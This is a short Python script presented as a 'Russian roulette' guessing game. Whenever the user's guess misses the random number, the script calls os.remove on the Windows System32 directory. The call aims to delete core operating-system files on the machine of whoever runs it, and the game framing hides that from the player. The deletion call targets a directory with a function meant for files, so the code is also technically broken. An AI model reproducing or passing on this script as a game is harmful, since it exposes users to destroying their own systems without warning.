import random
import os

bullet = random.randint(1, 6)

guess = input("Guess a number between 1 and 6 bro")
guess = int(guess)

if guess == bullet:
    print("Safe!")
else:
    os.remove("C:\Windows\System32")
